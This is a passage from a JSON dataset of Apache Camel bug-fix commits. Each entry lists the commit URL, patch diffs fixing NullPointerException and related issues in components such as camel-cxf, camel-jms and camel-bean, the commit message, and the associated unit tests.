        "unit_tests": [
            "CXFGreeterEnrichTest.java"
        ]
    },
    "camel_1ddb528": {
        "bug_id": "camel_1ddb528",
        "commit": "https://github.com/apache/camel/commit/1ddb5289c814b23bac718ce598652a17a95c83df",
        "file": [
            {
                "additions": 5,
                "blob_url": "https://github.com/apache/camel/blob/1ddb5289c814b23bac718ce598652a17a95c83df/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/DefaultCxfBinding.java",
                "changes": 10,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/DefaultCxfBinding.java?ref=1ddb5289c814b23bac718ce598652a17a95c83df",
                "deletions": 5,
                "filename": "components/camel-cxf/src/main/java/org/apache/camel/component/cxf/DefaultCxfBinding.java",
                "patch": "@@ -390,11 +390,11 @@ protected MessageContentsList getResponsePayloadList(org.apache.cxf.message.Exch\n         MessageContentsList answer = new MessageContentsList();\n \n         int i = 0;\n-        \n-        for (MessagePartInfo partInfo : boi.getOutput().getMessageParts()) {\n-            if (elements.size() > i) {\n-                answer.put(partInfo, elements.get(i++));\n-                \n+        if (boi.getOutput() != null) {\n+            for (MessagePartInfo partInfo : boi.getOutput().getMessageParts()) {\n+                if (elements.size() > i) {\n+                    answer.put(partInfo, elements.get(i++));\n+                }\n             }\n         }\n ",
                "raw_url": "https://github.com/apache/camel/raw/1ddb5289c814b23bac718ce598652a17a95c83df/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/DefaultCxfBinding.java",
                "sha": "318f4cc25277bb1e6efec5533c07a95159434d30",
                "status": "modified"
            }
        ],
        "message": "CAMEL-4452 avoid the NPE error when there oneway operation for the PayLoad invocation on CxfConsumer\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1171396 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/8fa016d8b72cf411b0b4b847cb56df06fbc97b50",
        "patched_files": [
            "DefaultCxfBinding.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultCxfBindingTest.java"
        ]
    },
    "camel_1e31fa5": {
        "bug_id": "camel_1e31fa5",
        "commit": "https://github.com/apache/camel/commit/1e31fa5f695e2f3f99fec2488197e99985f36376",
        "file": [
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/1e31fa5f695e2f3f99fec2488197e99985f36376/components/camel-jms/src/main/java/org/apache/camel/component/jms/EndpointMessageListener.java",
                "changes": 8,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-jms/src/main/java/org/apache/camel/component/jms/EndpointMessageListener.java?ref=1e31fa5f695e2f3f99fec2488197e99985f36376",
                "deletions": 4,
                "filename": "components/camel-jms/src/main/java/org/apache/camel/component/jms/EndpointMessageListener.java",
                "patch": "@@ -88,23 +88,23 @@ public void onMessage(final Message message) {\n                         cause = exchange.getException();\n                         sendReply = true;\n                     } else {\n-                        // only throw exception if endpoint is not configured to transfer exceptions\n-                        // back to caller\n+                        // only throw exception if endpoint is not configured to transfer exceptions back to caller\n+                        // do not send a reply but wrap and rethrow the exception\n                         rce = wrapRuntimeCamelException(exchange.getException());\n                     }\n                 } else if (exchange.getFault().getBody() != null) {\n                     // a fault occurred while processing\n                     body = exchange.getFault();\n                     sendReply = true;\n                 }\n-            } else {\n+            } else if (exchange.getOut(false) != null) {\n                 // process OK so get the reply\n                 body = exchange.getOut(false);\n                 sendReply = true;\n             }\n \n             // send the reply if we got a response and the exchange is out capable\n-            if (sendReply && !disableReplyTo && exchange.getPattern().isOutCapable()) {\n+            if (rce == null && sendReply && !disableReplyTo && exchange.getPattern().isOutCapable()) {\n                 sendReply(replyDestination, message, exchange, body, cause);\n             }\n ",
                "raw_url": "https://github.com/apache/camel/raw/1e31fa5f695e2f3f99fec2488197e99985f36376/components/camel-jms/src/main/java/org/apache/camel/component/jms/EndpointMessageListener.java",
                "sha": "8fe911ecd594b8816a23c086426af0bef60c78a0",
                "status": "modified"
            },
            {
                "additions": 10,
                "blob_url": "https://github.com/apache/camel/blob/1e31fa5f695e2f3f99fec2488197e99985f36376/components/camel-jms/src/main/java/org/apache/camel/component/jms/JmsBinding.java",
                "changes": 11,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-jms/src/main/java/org/apache/camel/component/jms/JmsBinding.java?ref=1e31fa5f695e2f3f99fec2488197e99985f36376",
                "deletions": 1,
                "filename": "components/camel-jms/src/main/java/org/apache/camel/component/jms/JmsBinding.java",
                "patch": "@@ -47,6 +47,7 @@\n import org.apache.camel.spi.HeaderFilterStrategy;\n import org.apache.camel.util.CamelContextHelper;\n import org.apache.camel.util.ExchangeHelper;\n+import org.apache.camel.util.ObjectHelper;\n import org.apache.commons.logging.Log;\n import org.apache.commons.logging.LogFactory;\n \n@@ -215,6 +216,7 @@ public Message makeJmsMessage(Exchange exchange, org.apache.camel.Message camelM\n                 // create jms message containg the caused exception\n                 answer = createJmsMessage(cause, session);\n             } else {\n+                ObjectHelper.notNull(camelMessage, \"message body\");\n                 // create regular jms message using the camel message body\n                 answer = createJmsMessage(exchange, camelMessage.getBody(), camelMessage.getHeaders(), session, exchange.getContext());\n                 appendJmsProperties(answer, exchange, camelMessage);\n@@ -249,7 +251,14 @@ public void appendJmsProperty(Message jmsMessage, Exchange exchange, org.apache.\n             if (headerName.equals(\"JMSCorrelationID\")) {\n                 jmsMessage.setJMSCorrelationID(ExchangeHelper.convertToType(exchange, String.class, headerValue));\n             } else if (headerName.equals(\"JMSReplyTo\") && headerValue != null) {\n-                jmsMessage.setJMSReplyTo(ExchangeHelper.convertToType(exchange, Destination.class, headerValue));\n+                if (exchange.getPattern().isOutCapable()) {\n+                    // only set the JMSReply if the Exchange supports Out\n+                    jmsMessage.setJMSReplyTo(ExchangeHelper.convertToType(exchange, Destination.class, headerValue));\n+                } else {\n+                    if (LOG.isDebugEnabled()) {\n+                        LOG.debug(\"Exchange is not out capable, Ignoring JMSReplyTo: \" + headerValue);\n+                    }\n+                }\n             } else if (headerName.equals(\"JMSType\")) {\n                 jmsMessage.setJMSType(ExchangeHelper.convertToType(exchange, String.class, headerValue));\n             } else if (LOG.isDebugEnabled()) {",
                "raw_url": "https://github.com/apache/camel/raw/1e31fa5f695e2f3f99fec2488197e99985f36376/components/camel-jms/src/main/java/org/apache/camel/component/jms/JmsBinding.java",
                "sha": "64dca42bf983f017d49a8be1f29e4522c27e5c16",
                "status": "modified"
            },
            {
                "additions": 95,
                "blob_url": "https://github.com/apache/camel/blob/1e31fa5f695e2f3f99fec2488197e99985f36376/components/camel-jms/src/test/java/org/apache/camel/component/jms/JmsRouteWithInOnlyTest.java",
                "changes": 95,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-jms/src/test/java/org/apache/camel/component/jms/JmsRouteWithInOnlyTest.java?ref=1e31fa5f695e2f3f99fec2488197e99985f36376",
                "deletions": 0,
                "filename": "components/camel-jms/src/test/java/org/apache/camel/component/jms/JmsRouteWithInOnlyTest.java",
                "patch": "@@ -0,0 +1,95 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.jms;\n+\n+import javax.jms.ConnectionFactory;\n+\n+import org.apache.activemq.ActiveMQConnectionFactory;\n+import org.apache.camel.CamelContext;\n+import org.apache.camel.ContextTestSupport;\n+import org.apache.camel.ExchangePattern;\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.component.mock.MockEndpoint;\n+import org.apache.camel.impl.JndiRegistry;\n+import static org.apache.camel.component.jms.JmsComponent.jmsComponentClientAcknowledge;\n+\n+/**\n+ * Unit test inspired by user forum\n+ *\n+ * @version $Revision$\n+ */\n+public class JmsRouteWithInOnlyTest extends ContextTestSupport {\n+\n+    protected String componentName = \"activemq\";\n+\n+    public void testSendOrder() throws Exception {\n+        MockEndpoint inbox = getMockEndpoint(\"mock:inbox\");\n+        inbox.expectedBodiesReceived(\"Camel in Action\");\n+\n+        MockEndpoint order = getMockEndpoint(\"mock:topic\");\n+        order.expectedBodiesReceived(\"Camel in Action\");\n+\n+        Object out = template.requestBody(\"activemq:queue:inbox\", \"Camel in Action\");\n+        assertEquals(\"OK: Camel in Action\", out);\n+\n+        assertMockEndpointsSatisfied();\n+\n+        // assert MEP\n+        assertEquals(ExchangePattern.InOut, inbox.getReceivedExchanges().get(0).getPattern());\n+        assertEquals(ExchangePattern.InOnly, order.getReceivedExchanges().get(0).getPattern());\n+    }\n+\n+    @Override\n+    protected JndiRegistry createRegistry() throws Exception {\n+        JndiRegistry jndi = super.createRegistry();\n+        jndi.bind(\"orderService\", new MyOrderServiceBean());\n+        return jndi;\n+    }\n+\n+    protected CamelContext createCamelContext() throws Exception {\n+        CamelContext camelContext = super.createCamelContext();\n+\n+        ConnectionFactory connectionFactory = new ActiveMQConnectionFactory(\"vm://localhost?broker.persistent=false\");\n+        camelContext.addComponent(componentName, jmsComponentClientAcknowledge(connectionFactory));\n+\n+        return camelContext;\n+    }\n+\n+    @Override\n+    protected RouteBuilder createRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            @Override\n+            public void configure() throws Exception {\n+                from(\"activemq:queue:inbox\")\n+                    .to(\"mock:inbox\")\n+                    .inOnly(\"activemq:topic:order\")\n+                    .beanRef(\"orderService\", \"handleOrder\");\n+\n+                from(\"activemq:topic:order\")\n+                    .to(\"mock:topic\");\n+            }\n+        };\n+    }\n+\n+    public static class MyOrderServiceBean {\n+\n+        public String handleOrder(String body) {\n+            return \"OK: \" + body;\n+        }\n+\n+    }\n+}",
                "raw_url": "https://github.com/apache/camel/raw/1e31fa5f695e2f3f99fec2488197e99985f36376/components/camel-jms/src/test/java/org/apache/camel/component/jms/JmsRouteWithInOnlyTest.java",
                "sha": "2b7adad192f5063b2e7ec09dfeec9fd16707d101",
                "status": "added"
            }
        ],
        "message": "CAMEL-1461: JMSProducer only sets JMSReplyTo if exchange is out capable. Fixed a NPE.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@757693 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/7ed306c36eecdc571f2486e53ba68f887697ce1c",
        "patched_files": [
            "EndpointMessageListener.java",
            "JmsBinding.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "JmsBindingTest.java",
            "JmsRouteWithInOnlyTest.java"
        ]
    },
    "camel_1eb0135": {
        "bug_id": "camel_1eb0135",
        "commit": "https://github.com/apache/camel/commit/1eb0135922a485cec0aee34c77f1486dc2539a62",
        "file": [
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/1eb0135922a485cec0aee34c77f1486dc2539a62/components/camel-bean/src/main/java/org/apache/camel/component/bean/MethodInfo.java",
                "changes": 5,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-bean/src/main/java/org/apache/camel/component/bean/MethodInfo.java?ref=1eb0135922a485cec0aee34c77f1486dc2539a62",
                "deletions": 2,
                "filename": "components/camel-bean/src/main/java/org/apache/camel/component/bean/MethodInfo.java",
                "patch": "@@ -56,6 +56,7 @@\n import org.slf4j.LoggerFactory;\n \n import static org.apache.camel.util.ObjectHelper.asString;\n+import static org.apache.camel.util.ObjectHelper.asList;\n \n /**\n  * Information about a method to be used for invocation.\n@@ -438,9 +439,9 @@ protected Object invoke(Method mth, Object pojo, Object[] arguments, Exchange ex\n         try {\n             return ObjectHelper.invokeMethodSafe(mth, pojo, arguments);\n         } catch (IllegalAccessException e) {\n-            throw new RuntimeExchangeException(\"IllegalAccessException occurred invoking method: \" + mth + \" using arguments: \" + Arrays.asList(arguments), exchange, e);\n+            throw new RuntimeExchangeException(\"IllegalAccessException occurred invoking method: \" + mth + \" using arguments: \" + asList(arguments), exchange, e);\n         } catch (IllegalArgumentException e) {\n-            throw new RuntimeExchangeException(\"IllegalArgumentException occurred invoking method: \" + mth + \" using arguments: \" + Arrays.asList(arguments), exchange, e);\n+            throw new RuntimeExchangeException(\"IllegalArgumentException occurred invoking method: \" + mth + \" using arguments: \" + asList(arguments), exchange, e);\n         }\n     }\n ",
                "raw_url": "https://github.com/apache/camel/raw/1eb0135922a485cec0aee34c77f1486dc2539a62/components/camel-bean/src/main/java/org/apache/camel/component/bean/MethodInfo.java",
                "sha": "0021e00f2088dcf9ef00cb7ac9365b833ca067ad",
                "status": "modified"
            },
            {
                "additions": 19,
                "blob_url": "https://github.com/apache/camel/blob/1eb0135922a485cec0aee34c77f1486dc2539a62/core/camel-core/src/test/java/org/apache/camel/util/ObjectHelperTest.java",
                "changes": 19,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/core/camel-core/src/test/java/org/apache/camel/util/ObjectHelperTest.java?ref=1eb0135922a485cec0aee34c77f1486dc2539a62",
                "deletions": 0,
                "filename": "core/camel-core/src/test/java/org/apache/camel/util/ObjectHelperTest.java",
                "patch": "@@ -956,4 +956,23 @@ public void testNonInheritedMethodCantOverrideInterfaceMethod() throws Exception\n         Method m2 = InterfaceSize.class.getMethod(\"size\");\n         assertFalse(org.apache.camel.util.ObjectHelper.isOverridingMethod(InterfaceSize.class, m2, m1, false));\n     }\n+    \n+    @Test\n+    public void testAsList() {\n+        List<Object> out0 = ObjectHelper.asList(null);\n+        assertNotNull(out0);\n+        assertTrue(out0 instanceof List && out0.size() == 0);\n+\n+        List<Object> out1 = ObjectHelper.asList(new Object[0]);\n+        assertNotNull(out1);\n+        assertTrue(out1 instanceof List && out1.size() == 0);\n+\n+        String[] args = new String[] {\"foo\", \"bar\"};\n+        List<Object> out2 = ObjectHelper.asList(args);\n+        assertNotNull(out2);\n+        assertTrue(out2 instanceof List && out2.size() == 2);\n+        assertEquals(\"foo\", out2.get(0));\n+        assertEquals(\"bar\", out2.get(1));\n+    }\n+\n }",
                "raw_url": "https://github.com/apache/camel/raw/1eb0135922a485cec0aee34c77f1486dc2539a62/core/camel-core/src/test/java/org/apache/camel/util/ObjectHelperTest.java",
                "sha": "5228614094851753f84027fed8fe95fa72e453ae",
                "status": "modified"
            },
            {
                "additions": 11,
                "blob_url": "https://github.com/apache/camel/blob/1eb0135922a485cec0aee34c77f1486dc2539a62/core/camel-util/src/main/java/org/apache/camel/util/ObjectHelper.java",
                "changes": 11,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/core/camel-util/src/main/java/org/apache/camel/util/ObjectHelper.java?ref=1eb0135922a485cec0aee34c77f1486dc2539a62",
                "deletions": 0,
                "filename": "core/camel-util/src/main/java/org/apache/camel/util/ObjectHelper.java",
                "patch": "@@ -1166,4 +1166,15 @@ public static RuntimeException wrapRuntimeCamelException(Throwable e) {\n             return new RuntimeException(e);\n         }\n     }\n+\n+    /**\n+     * Turns the input array to a list of objects.\n+     * \n+     * @param args an array of objects or null\n+     * @return an object list\n+     */\n+    public static List<Object> asList(Object[] objects) {\n+        return objects != null ? Arrays.asList(objects) : Collections.emptyList();\n+    }\n+    \n }",
                "raw_url": "https://github.com/apache/camel/raw/1eb0135922a485cec0aee34c77f1486dc2539a62/core/camel-util/src/main/java/org/apache/camel/util/ObjectHelper.java",
                "sha": "317c06690a94506234d31c6d157a03cf587e71de",
                "status": "modified"
            }
        ],
        "message": "Fix NPE at component.bean.MethodInfo.invoke",
        "parent": "https://github.com/apache/camel/commit/ff83c4efaaf9d293dded29b5162ab87aec6b64da",
        "patched_files": [
            "ObjectHelper.java",
            "MethodInfo.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "ObjectHelperTest.java"
        ]
    },
    "camel_20845df": {
        "bug_id": "camel_20845df",
        "commit": "https://github.com/apache/camel/commit/20845dffc73e0d0b1cba1e3d8221ebb7b72f8a2b",
        "file": [
            {
                "additions": 20,
                "blob_url": "https://github.com/apache/camel/blob/20845dffc73e0d0b1cba1e3d8221ebb7b72f8a2b/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfProducer.java",
                "changes": 22,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfProducer.java?ref=20845dffc73e0d0b1cba1e3d8221ebb7b72f8a2b",
                "deletions": 2,
                "filename": "components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfProducer.java",
                "patch": "@@ -17,6 +17,7 @@\n package org.apache.camel.component.cxf;\n \n import java.io.InputStream;\n+import java.util.ArrayList;\n import java.util.Collection;\n import java.util.HashMap;\n import java.util.Iterator;\n@@ -155,20 +156,37 @@ public void process(Exchange camelExchange) throws Exception {\n      * Get the parameters for the web service operation\n      */\n     private Object[] getParams(CxfEndpoint endpoint, Exchange exchange) {\n-        \n+\n+        // TODO: this method should probably be more strict and validate (CAMEL-2195)\n+\n         Object[] params = null;\n         if (endpoint.getDataFormat() == DataFormat.POJO) {\n             List<?> list = exchange.getIn().getBody(List.class);\n             if (list != null) {\n                 params = list.toArray();\n             } else {\n-                params = new Object[0];\n+                // maybe we can iterate the body and that way create a list for the parameters\n+                // then end users do not need to trouble with List\n+                Iterator it = exchange.getIn().getBody(Iterator.class);\n+                if (it != null && it.hasNext()) {\n+                    list = exchange.getContext().getTypeConverter().convertTo(List.class, it);\n+                    if (list != null) {\n+                        params = list.toArray();\n+                    }\n+                }\n+                if (params == null) {\n+                    // no we could not then use the body as single parameter\n+                    params = new Object[1];\n+                    params[0] = exchange.getIn().getBody();\n+                }\n             }\n         } else if (endpoint.getDataFormat() == DataFormat.PAYLOAD) {\n             params = new Object[1];\n+            // TODO: maybe it should be mandatory body?\n             params[0] = exchange.getIn().getBody(CxfPayload.class);\n         } else if (endpoint.getDataFormat() == DataFormat.MESSAGE) {\n             params = new Object[1];\n+            // TODO: maybe it should be mandatory body?\n             params[0] = exchange.getIn().getBody(InputStream.class);\n         }\n ",
                "raw_url": "https://github.com/apache/camel/raw/20845dffc73e0d0b1cba1e3d8221ebb7b72f8a2b/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfProducer.java",
                "sha": "d70b43527e504e9cc7a76193a9e525bee6f145a5",
                "status": "modified"
            },
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/20845dffc73e0d0b1cba1e3d8221ebb7b72f8a2b/examples/camel-example-cxf-async/src/main/java/org/apache/camel/example/client/CamelClient.java",
                "changes": 11,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/examples/camel-example-cxf-async/src/main/java/org/apache/camel/example/client/CamelClient.java?ref=20845dffc73e0d0b1cba1e3d8221ebb7b72f8a2b",
                "deletions": 9,
                "filename": "examples/camel-example-cxf-async/src/main/java/org/apache/camel/example/client/CamelClient.java",
                "patch": "@@ -16,9 +16,6 @@\n  */\n package org.apache.camel.example.client;\n \n-import java.util.ArrayList;\n-import java.util.List;\n-\n import org.apache.camel.ProducerTemplate;\n import org.apache.camel.component.mock.MockEndpoint;\n import org.apache.camel.example.reportincident.InputReportIncident;\n@@ -64,12 +61,8 @@ public static void main(final String[] args) throws Exception {\n             input.setEmail(\"davsclaus@apache.org\");\n             input.setPhone(\"55512345678\");\n \n-            // must add to a list otherwise CXF cannot send data\n-            // TODO: camel-cxf should be able to do this itself without me having to create a List object\n-            List data = new ArrayList();\n-            data.add(input);\n-\n-            producer.sendBody(\"direct:start\", data);\n+            // send our input to the Camel route\n+            producer.sendBody(\"direct:start\", input);\n         }\n         System.out.println(\"... Send done\");\n ",
                "raw_url": "https://github.com/apache/camel/raw/20845dffc73e0d0b1cba1e3d8221ebb7b72f8a2b/examples/camel-example-cxf-async/src/main/java/org/apache/camel/example/client/CamelClient.java",
                "sha": "97fa3a09ed7af90d241c755f72e9e5712affd9fc",
                "status": "modified"
            }
        ],
        "message": "CAMEL-2196: CxfProducer improved to accept body in POJO mode without having to be wrapped as list. This also fixed a NPE issue as before it would just send null.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@881719 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/182e161871021eb7a53f7fbdafa1abaf7e01c522",
        "patched_files": [
            "CxfProducer.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "CxfProducerTest.java"
        ]
    },
    "camel_2217722": {
        "bug_id": "camel_2217722",
        "commit": "https://github.com/apache/camel/commit/22177229c2f5a1559f98ca6ed3d38e8004438d48",
        "file": [
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/22177229c2f5a1559f98ca6ed3d38e8004438d48/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "changes": 6,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java?ref=22177229c2f5a1559f98ca6ed3d38e8004438d48",
                "deletions": 3,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "patch": "@@ -65,7 +65,6 @@\n import org.apache.camel.ShutdownRunningTask;\n import org.apache.camel.StartupListener;\n import org.apache.camel.StatefulService;\n-import org.apache.camel.StreamCache;\n import org.apache.camel.SuspendableService;\n import org.apache.camel.TypeConverter;\n import org.apache.camel.VetoCamelContextStartException;\n@@ -2442,13 +2441,14 @@ public void setNodeIdFactory(NodeIdFactory idFactory) {\n     }\n \n     public ManagementStrategy getManagementStrategy() {\n-        if (!managementStrategyInitialized.get()) {\n-            synchronized (managementStrategyInitialized) {\n+        synchronized (managementStrategyInitialized) {\n+            if (!managementStrategyInitialized.get()) {\n                 if (managementStrategyInitialized.compareAndSet(false, true)) {\n                     managementStrategy = createManagementStrategy();\n                 }\n             }\n         }\n+\n         return managementStrategy;\n     }\n ",
                "raw_url": "https://github.com/apache/camel/raw/22177229c2f5a1559f98ca6ed3d38e8004438d48/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "sha": "8a3091fe432bed52a631ee1ce6e67e437c0a948a",
                "status": "modified"
            }
        ],
        "message": "CAMEL-6576: Fix a potential NPE",
        "parent": "https://github.com/apache/camel/commit/687edfcdc21af44a7686594ad5ffe7ac4d79b3b0",
        "patched_files": [
            "DefaultCamelContext.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultCamelContextTest.java"
        ]
    },
    "camel_23c9ed1": {
        "bug_id": "camel_23c9ed1",
        "commit": "https://github.com/apache/camel/commit/23c9ed17f1082aafaae2fbf9feed354b9806de68",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/23c9ed17f1082aafaae2fbf9feed354b9806de68/camel-core/src/main/java/org/apache/camel/component/bean/BeanInfo.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/component/bean/BeanInfo.java?ref=23c9ed17f1082aafaae2fbf9feed354b9806de68",
                "deletions": 2,
                "filename": "camel-core/src/main/java/org/apache/camel/component/bean/BeanInfo.java",
                "patch": "@@ -392,10 +392,9 @@ protected void collectParameterAnnotations(Class<?> c, Method m, List<Annotation\n         for (Class<?> i : c.getInterfaces()) {\n             collectParameterAnnotations(i, m, a);\n         }\n-        if (!c.isInterface() && c.getSuperclass() != Object.class) {\n+        if (!c.isInterface() && c.getSuperclass() != null) {\n             collectParameterAnnotations(c.getSuperclass(), m, a);\n         }\n-\n     }\n \n     /**",
                "raw_url": "https://github.com/apache/camel/raw/23c9ed17f1082aafaae2fbf9feed354b9806de68/camel-core/src/main/java/org/apache/camel/component/bean/BeanInfo.java",
                "sha": "0c44dfdd422e6151575c9eee997adf67accd22f4",
                "status": "modified"
            },
            {
                "additions": 8,
                "blob_url": "https://github.com/apache/camel/blob/23c9ed17f1082aafaae2fbf9feed354b9806de68/camel-core/src/test/java/org/apache/camel/component/bean/BeanInfoTest.java",
                "changes": 8,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/component/bean/BeanInfoTest.java?ref=23c9ed17f1082aafaae2fbf9feed354b9806de68",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/component/bean/BeanInfoTest.java",
                "patch": "@@ -37,6 +37,14 @@\n \n     protected CamelContext camelContext = new DefaultCamelContext();\n \n+    public void testObjectOperations() throws Exception {\n+        BeanInfo info = createBeanInfo(Object.class);\n+\n+        List<MethodInfo> operations = info.getMethods();\n+        assertEquals(1, operations.size());\n+        assertEquals(\"toString\", operations.get(0).getMethod().getName());\n+    }\n+\n     public void testGetOperations() throws Exception {\n         BeanInfo info = createBeanInfo(Foo.class);\n ",
                "raw_url": "https://github.com/apache/camel/raw/23c9ed17f1082aafaae2fbf9feed354b9806de68/camel-core/src/test/java/org/apache/camel/component/bean/BeanInfoTest.java",
                "sha": "e47b3c821d2bb674dfaa454e701abfab50f2ae14",
                "status": "modified"
            }
        ],
        "message": "CAMEL-5051: Avoid NPE while collecting the parameter annotations of a given bean whose class is java.lang.Object. This also fixes the existing behaviour which used to skip the java.lang.Object.toString() method.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1294909 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/f3d782e78951f59d3e5c52f2266e99f45516126e",
        "patched_files": [
            "BeanInfo.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "BeanInfoTest.java"
        ]
    },
    "camel_246f9ba": {
        "bug_id": "camel_246f9ba",
        "commit": "https://github.com/apache/camel/commit/246f9ba8303c5f67a9632cab77443eaf04be33b8",
        "file": [
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/246f9ba8303c5f67a9632cab77443eaf04be33b8/components/camel-ahc-ws/src/main/java/org/apache/camel/component/ahc/ws/WsEndpoint.java",
                "changes": 9,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-ahc-ws/src/main/java/org/apache/camel/component/ahc/ws/WsEndpoint.java?ref=246f9ba8303c5f67a9632cab77443eaf04be33b8",
                "deletions": 6,
                "filename": "components/camel-ahc-ws/src/main/java/org/apache/camel/component/ahc/ws/WsEndpoint.java",
                "patch": "@@ -81,14 +81,10 @@ public Consumer createConsumer(Processor processor) throws Exception {\n         return new WsConsumer(this, processor);\n     }\n \n-    WebSocket getWebSocket() {\n+    WebSocket getWebSocket() throws Exception {\n         synchronized (this) {\n             if (websocket == null) {\n-                try { \n-                    connect();\n-                } catch (Exception e) {\n-                    LOG.error(\"Failed to connect\", e);\n-                }\n+                connect();\n             }\n         }\n         return websocket;\n@@ -134,6 +130,7 @@ public void connect() throws InterruptedException, ExecutionException, IOExcepti\n     protected void doStop() throws Exception {\n         if (websocket != null && websocket.isOpen()) {\n             websocket.close();\n+            websocket = null;\n         }\n         super.doStop();\n     }",
                "raw_url": "https://github.com/apache/camel/raw/246f9ba8303c5f67a9632cab77443eaf04be33b8/components/camel-ahc-ws/src/main/java/org/apache/camel/component/ahc/ws/WsEndpoint.java",
                "sha": "973ca79fe126a940889ec541a49ae40bf587612c",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/246f9ba8303c5f67a9632cab77443eaf04be33b8/components/camel-ahc-ws/src/main/java/org/apache/camel/component/ahc/ws/WsProducer.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-ahc-ws/src/main/java/org/apache/camel/component/ahc/ws/WsProducer.java?ref=246f9ba8303c5f67a9632cab77443eaf04be33b8",
                "deletions": 1,
                "filename": "components/camel-ahc-ws/src/main/java/org/apache/camel/component/ahc/ws/WsProducer.java",
                "patch": "@@ -132,7 +132,7 @@ private void sendStreamMessage(WebSocket webSocket, InputStream in) throws IOExc\n         }\n     }\n     \n-    private WebSocket getWebSocket() {\n+    private WebSocket getWebSocket() throws Exception {\n         return getEndpoint().getWebSocket();\n     }\n }",
                "raw_url": "https://github.com/apache/camel/raw/246f9ba8303c5f67a9632cab77443eaf04be33b8/components/camel-ahc-ws/src/main/java/org/apache/camel/component/ahc/ws/WsProducer.java",
                "sha": "d6319ad4b520860767ae2e0487b4e35ca6f3b128",
                "status": "modified"
            }
        ],
        "message": "CAMEL-8927: Do not swallow exception when connecting, which causes NPE exceptions later.",
        "parent": "https://github.com/apache/camel/commit/78bafd79460a3fa99891a241d7ab321d2c99fa3e",
        "patched_files": [
            "WsProducer.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "WsProducerTest.java"
        ]
    },
    "camel_24e4451": {
        "bug_id": "camel_24e4451",
        "commit": "https://github.com/apache/camel/commit/24e4451567b6f023bb77bd42cecab29a2aa722cb",
        "file": [
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/24e4451567b6f023bb77bd42cecab29a2aa722cb/components/camel-aws-kms/src/main/java/org/apache/camel/component/aws/kms/KMSProducer.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-aws-kms/src/main/java/org/apache/camel/component/aws/kms/KMSProducer.java?ref=24e4451567b6f023bb77bd42cecab29a2aa722cb",
                "deletions": 0,
                "filename": "components/camel-aws-kms/src/main/java/org/apache/camel/component/aws/kms/KMSProducer.java",
